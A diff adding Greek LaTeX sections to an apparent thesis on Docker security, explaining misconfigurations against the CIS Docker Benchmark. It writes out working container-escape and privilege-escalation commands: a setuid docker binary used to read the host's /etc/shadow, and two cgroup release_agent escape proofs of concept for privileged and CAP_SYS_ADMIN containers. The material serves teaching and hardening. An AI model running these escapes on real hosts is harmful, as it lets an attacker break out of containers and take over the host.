@@ -209,6 +209,222 @@
 πρόσβασης του χρήστη από μόνο του και θα αλλάξει μόνο συγκεκριμένες καταχωρήσεις
 στο αρχείο κωδικού πρόσβασης.
 
+Εάν ένα σύστημα έχει ρυθμιστεί εσφαλμένα με τη ρύθμιση του
+\texttt{\textlatin{setuid}} \textlatin{bit} για το \textlatin{docker binary},
+ένας χρήστης θα μπορεί να εκτελέσει το \textlatin{Docker} ως
+\texttt{\textlatin{root}} (ο κάτοχος του \textlatin{docker binary}). Όπως και
+πριν, μπορούμε εύκολα να αναπαράξουμε αυτήν την επίθεση. \\
+
+\texttt{\textlatin{(host)\$ sudo -v}}
+
+\texttt{\textlatin{Sorry, user unpriv may not run sudo on host.}}
+
+\texttt{\textlatin{(host)\$ groups | grep -o docker}}
+
+\texttt{\textlatin{(host)\$ ls -halt /usr/bin/docker}}
+
+\texttt{\textlatin{-rwsr-xr-x 1 root root 85M nov 18 17:52 /usr/bin/docker}}
+
+\texttt{\textlatin{(host)\$ docker run -it --rm -v /:/host ubuntu:latest bash}}
+
+\texttt{\textlatin{(cont)\# grep admin /host/etc/shadow}}
+
+\texttt{\textlatin{admin:\$6\$VOSV5AVQ\$jHWxAVAUgl...:18142:0:99999:7:::}} \\
+
+Στη παραάνω λίστα βλέπουμε ότι δεν είμαστε μέρος της ομάδας \textlatin{docker},
+αλλά μπορούμε ακόμα να εκτελέσουμε το \textlatin{docker} επειδή το
+\texttt{\textlatin{setuid}} \textlatin{bit} (και το
+\texttt{\textlatin{execute}} \textlatin{bit} για όλους χρήστες) έχει οριστεί.
+
+Αυτό δεν καλύπτεται από τις κατευθυντήριες γραμμές του
+\textlatin{CIS Docker Benchmark}. Υπάρχουν πολλές οδηγίες σχετικά με τα σωστά
+δικαιώματα αρχείων και καταλόγου, αλλά καμία δεν καλύπτει τα
+\textlatin{binaries}.
+
+\subsection{Αναγνώσιμα αρχεία ρυθμίσεων}
+
+Επειδή η ρύθμιση περιβαλλόντων με το \textlatin{Docker} μπορεί να είναι
+αρκετά περίπλοκη, πολλοί χρήστες \textlatin{Docker} χρησιμοποιούν προγράμματα
+(π.χ. \texttt{\textlatin{docker-compose}}) για να αποθηκεύσουν όλες τις
+απαραίτητες ρυθμίσεις \textlatin{Docker} στα αρχεία διαμόρφωσης για να
+καταργήσουν την ανάγκη επαναληπτικών βημάτων και διαμορφώσεων. Αυτά τα αρχεία
+ρυθμίσεων συχνά περιέχουν ευαίσθητες πληροφορίες. Εάν τα δικαιώματα σε αυτά τα
+αρχεία δεν έχουν ρυθμιστεί σωστά, οι χρήστες οι οποίοι δεν θα έπρεπε να μπορούν
+να τα διαβάσουν θα τα διαβάζουν.
+
+Οι χρήστες \textlatin{Docker} και οι \textlatin{penetration testers} θα πρέπει
+να δώσουν ιδιαίτερη προσοχή σε αυτά αρχεία, γιατί θα μπορούσαν εύκολα να
+οδηγήσουν σε διαρροή μυστικών.
+
+Δύο κοινά αρχεία που ενδέχεται να περιέχουν ευαίσθητες πληροφορίες είναι τα 
+\texttt{\textlatin{.docker
+/config.json}} και \texttt{\textlatin{docker-compose.yaml}}.
+
+Αυτό δεν καλύπτεται σε καμία οδηγία του \textlatin{CIS Docker Benchmark}. Καλύπτονται πολλά αρχεία διαμόρφωσης (π.χ. /etc/docker/daemon.json), αλλά
+δεν υπάρχουν αρχεία καθορισμένα από το χρήστη.
+
+\subsubsection{\texttt{\textlatin{.docker/config.json}}}
+
+Κατά το ανέβασμα εικόνων σε ένα μητρώο, οι χρήστες πρέπει να συνδεθούν στο
+μητρώο στο οποίο πιστοποιούν τον εαυτό τους. Θα ήταν αρκετά ενοχλητικό να
+συνδεόμαστε κάθε φορά που ένας χρήστης θέλει να ανεβάσει μια εικόνα. Αυτός
+είναι ο λόγος για τον οποίο το \texttt{\textlatin{.docker/config.json}}
+αποθηκεύει προσωρινά αυτά τα \textlatin{credentials}. Αυτά είναι αποθηκευμένα
+σε κωδικοποίηση \textlatin{Base64} στον αρχικό κατάλογο του χρήστη από
+προεπιλογή
+\footnote{\textlatin{https://docs.docker.com/engine/reference/commandline/login/}}.
+Ένας επιτιθέμενος με πρόσβαση στο αρχείο μπορεί να χρησιμοποιήσει τα
+\textlatin{credentials} για να συνδεθεί και να ανεβάσει κακόβουλες εικόνες
+\textlatin{Docker} \cite{Docker-Credentials-Metasploit}.
+
+\subsubsection{\texttt{\textlatin{docker-compose.yml}}}
+
+Τα αρχεία \texttt{\textlatin{docker-compose.yml}} συχνά περιέχουν μυστικά (π.χ.
+κωδικούς πρόσβασης και κλειδιά \textlatin{API}), επειδή όλες οι πληροφορίες που
+πρέπει να διαβιβαστούν σε ένα κοντέινερ αποθηκεύονται στο
+αρχείο \texttt{\textlatin{docker-compose.yml}} \footnote{Η καταλήξεις
+\texttt{\textlatin{yml}} και \texttt{\textlatin{yaml}} είναι ταυτοδύναμες όμως
+η επίσημη είναι η \texttt{\textlatin{yaml}}}.
+
+\subsection{\textlatin{Privileged Mode}}
+
+Το \textlatin{Docker} έχει μια ειδική προνομιακή λειτουργία
+\cite{Docker-in-Docker-Blog}. Αυτή η λειτουργία είναι ενεργοποιημένη εάν κατά
+την δημιουργία ενός κοντέινερ δοθεί η παράμετρος
+\texttt{\textlatin{--privileged}} η οποία επιτρέπει τη πρόσβαση σε όλους τους
+κεντρικούς υπολογιστές συσκευές και σε δυνατότητες του πυρήνα. Αυτή είναι μια
+ισχυρή λειτουργία που επιτρέπει ορισμένες χρήσιμες λειτουργίες (π.χ. δημιουργία
+εικόνων \textlatin{Docke} μέσα σε κοντέινερ \textlatin{Docker}). Το μειονέκτημα
+της προνομιακής λειτουργίας είναι ότι όλες οι λειτουργίες του πυρήνα επιτρέπουν
+σε ένα επιτιθέμενο μέσα στο κοντέινερ να διαφύγει και να αποκτήσει πρόσβαση
+στον κεντρικό υπολογιστή.
+
+Ένα παράδειγμα αυτού είναι η κατάχρηση ενός χαρακτηριστικού στα
+\texttt{\textlatin{cgroups}} \cite{CGroup-Docs}. Όποτε ένα 
+\texttt{\textlatin{cgroup}} απελευθερώνεται λόγω απουσίας διεργασιών που
+τρέχουν, είναι δυνατό για να εκτελέσουμε μια εντολή (που ονομάζεται
+\textlatin{release\_agent}). Είναι δυνατόν να ορίσουμε τέτοια
+\textlatin{release\_agent} σε ένα προνομιακό \textlatin{docker}.
+Εάν το \texttt{\textlatin{cgroup}} απελευθερωθεί, τότε
+η εντολή εκτελείται στον κεντρικό υπολογιστή \cite{TrailOfBits-Docker-Escape}.
+
+Μπορούμε να δούμε μια απόδειξη της ιδέας αυτής της επίθεσης που αναπτύχθηκε από
+τον ερευνητή ασφαλείας Felix Wilhelm \cite{Felix-Wilhem-Tweet}. \\
+
+\texttt{\textlatin{1. (host)\$ docker run -it --rm --privileged ubuntu:latest bash}}
+
+\texttt{\textlatin{2. (cont)\# d=`dirname \$(ls -x /s*/fs/c*/*/r* |head -n1)`}}
+
+\texttt{\textlatin{3. (cont)\# mkdir -p \$d/w}}
+
+\texttt{\textlatin{4. (cont)\# echo 1 >\$d/w/notify\_on\_release}}
+
+\texttt{\textlatin{5. (cont)\# t=`sed -n 's/.*\textbackslash perdir=\textbackslash ([\^,]*\textbackslash ).*/\textbackslash 1/p' /etc/mtab`}}
+
+\texttt{\textlatin{6. (cont)\# touch /o}}
+
+\texttt{\textlatin{7. (cont)\# echo \$t/c >\$d/release\_agent}}
+
+\texttt{\textlatin{8. (cont)\# printf '\#!/bin/sh\textbackslash nps >'"\$t/o" >/c}}
+
+\texttt{\textlatin{9. (cont)\# chmod +x /c}}
+
+\texttt{\textlatin{10. (cont)\# sh -c "echo 0 >\$d/w/cgroup.procs"}}
+
+\texttt{\textlatin{11. (cont)\# sleep 1}}
+
+\texttt{\textlatin{12. (cont)\# cat /o}} \\
+
+Η απόδειξη της έννοιας στη παραπάνω λίστα είναι λίγο δύσκολο να διαβαστεί,
+γιατί χρησιμοποιεί πολλή σύνταξη \textlatin{Bash} για να συντομεύσει τις
+εντολές. Θα αναλύσουμε τις εντολές γραμμή προς γραμμή για να εξηγήσουμε τι
+κάνει κάθε μία.
+
+Στη γραμμή 2, το πρώτο \textlatin{cgroup} με \textlatin{release\_agent}
+προστίθεται στη μεταβλητή \textlatin{d}. Μια υποομάδα \textlatin{w} προστίθεται
+στην ομάδα \textlatin{c} του \textlatin{d} (γραμμή 3) και η εκτέλεση του
+\textlatin{release\_agent} είναι ενεργοποιημένο για το \textlatin{w} (γραμμή 4).
+Η θέση του κοντέινερ στο σύστημα αρχείων του κεντρικό σύστημα αρχείων
+προστίθεται στη μεταβλητή \textlatin{t} (γραμμή 5). Ένα \textlatin{script}
+το (/\textlatin{c}), που περιέχει μόνο τη γραμμή "\textlatin{ps > \$t/o"},
+δημιουργείται (γραμμή 7) και προστίθεται
+ως \textlatin{release\_agent} (γραμμή 8). Μια διαδικασία προσθέτει το εαυτό της
+στο \textlatin{w} (γράφοντας «0» στο αρχείο \textlatin{cgroup.procs} του 
+\textlatin{w}) στη γραμμή 10. Μετά την εκτέλεση του \textlatin{release\_agent}
+(/\textlatin{c}), μπορούμε να δούμε όλες τις διεργασίες στον κεντρικό
+υπολογιστή στο /\textlatin{ο}.
+
+Το όρισμα \texttt{\textlatin{--privileged}} καλύπτεται από δύο κατευθυντήριες
+γραμμές του \textlatin{CIS Docker Benchmark}. Η Οδηγία 5.4 (Βεβαιωθείτε ότι δεν
+χρησιμοποιούνται προνομιακά κοντέινερ) συνιστά να μην δημιουργούμε κοντέινερ με
+προνομιακή λειτουργία. Η κατευθυντήρια γραμμή 5.22 (Βεβαιωθείτε ότι οι εντολές
+\textlatin{docker exec} δεν χρησιμοποιούνται με την προνομιακή επιλογή) συνιστά
+να μην εκτελούνται εντολές σε κοντέινερ που εκτελούνται (με
+\textlatin{docker exec}) σε προνομιακή λειτουργία.
+
+\subsection{Δυνατότητες}
+
+Όπως είδαμε σε προηγούμενη ενότητα, προκειμένου να πραγματοποιηθούν προνομιακές
+ενέργειες στο πυρήνα \textlatin{Linux}, μια διεργασία χρειάζεται τη σχετική
+δυνατότητα. Τα \textlatin{Docker} κοντέινερς ξεκινούν με ελάχιστες δυνατότητες, αλλά είναι
+δυνατή η προσθήκη επιπλέον δυνατοτήτων κατά το χρόνο εκτέλεσης. Η παροχή
+επιπλέον δυνατοτήτων στα κοντέινερς δίνει στο κοντέινερ άδεια εκτέλεσης
+ορισμένων ενεργειών. Ορισμένες από αυτές τις ενέργειες επιτρέπουν να διαφύγει
+κανείς από το \textlatin{Docker} κοντέινερ. Θα εξετάσουμε δύο τέτοιες
+δυνατότητες στις επόμενες ενότητες.
+
+
+Το \textlatin{CIS Docker Benchmark} καλύπτει όλα αυτά τα προβλήματα σε μία
+κατευθυντήρια γραμμή: 5.3 (Βεβαιωθείτε ότι οι δυνατότητες του πυρήνα του
+\textlatin{Linux} είναι περιορισμένες εντός των κοντέινερ).
+
+\subsubsection{\texttt{\textlatin{CAP\_SYS\_ADMIN}}}
+
+Η απόδραση \textlatin{Docker} σύμφωνα με τον \textlatin{Felix Wilhelm}
+\cite{Felix-Wilhem-Tweet} που χρησιμοποιήσαμε στην ενότητα 4.1.3 χρειάζεται να
+εκτελείται σε προνομιακή λειτουργία για να λειτουργήσει, αλλά μπορεί να
+ξαναγραφτεί για να χρειάζεται μόνο το δικαίωμα εκτέλεσης του προσαρτήματος
+\cite{TrailOfBits-Docker-Escape}, το οποίο χορηγείται από την δυνατότητα
+\texttt{\textlatin{CAP\_SYS\_ADMIN}}. \\
+
+\texttt{\textlatin{1. (host)\$ docker run --rm -it --cap-add=CAP\_SYS\_ADMIN --security -opt apparmor=unconfined ubuntu /bin/bash}}
+
+\texttt{\textlatin{2. (cont)\# mkdir /tmp/cgrp}}
+
+\texttt{\textlatin{3. (cont)\# mount -t cgroup -o rdma cgroup /tmp/cgrp}}
+
+\texttt{\textlatin{4. (cont)\# mkdir /tmp/cgrp/x}}
+
+\texttt{\textlatin{5. (cont)\# echo 1 > /tmp/cgrp/x/notify\_on\_release}}
+
+\texttt{\textlatin{6. (cont)\# host\_path=`sed -n 's/.*\textbackslash perdir=\textbackslash ([\^,]*\textbackslash).*/\textbackslash 1/p' /etc/mtab`}}
+
+\texttt{\textlatin{7. (cont)\# echo "\$host\_path/cmd" > /tmp/cgrp/release\_agent}}
+
+\texttt{\textlatin{8. (cont)\# echo '\#!/bin/sh' > /cmd}}
+
+\texttt{\textlatin{9. (cont)\# echo "ps aux > \$host\_path/output" >> /cmd}}
+
+\texttt{\textlatin{10. (cont)\# chmod a+x /cmd}}
+
+\texttt{\textlatin{11. (cont)\# sh -c "echo \textbackslash \$\textbackslash \$ > /tmp/cgrp/x/cgroup.procs"1}}
+
+\texttt{\textlatin{12. (cont)\# cat /output}} \\
+
+Σε αντίθεση με πριν, αντί να βασιζόμαστε στη παράμετρο
+\texttt{\textlatin{--privileged}} για να μας δώσει πρόσβαση εγγραφής σε ένα
+\textlatin{cgroup}, πρέπει απλώς να κάνουμε \textlatin{mount} τη δική μας. Στη
+γραμμή 2 και γραμμή 3 ένα νέο \textlatin{cgroup} με όνομα \textlatin{cgrp}
+δημιουργείται και προσαρτάται στο \textlatin{/tmp/cgrp}. Τώρα έχουμε ένα
+\textlatin{cgroup} στο οποίο έχουμε επίσης πρόσβαση εγγραφής, έτσι μπορούμε να
+εκτελέσουμε το ίδιο \textlatin{exploit} όπως στο ενότητα 4.1.3.
+
+\subsubsection{\texttt{\textlatin{CAP\_DAC\_READ\_SEARCH}}}
+
+\subsection{\textlatin{Docker Socket}}
+
+
+
 \section{Σφάλματα Λογισμικού}
 \section{Γνωστά \textlatin{Docker CVEs}}
 
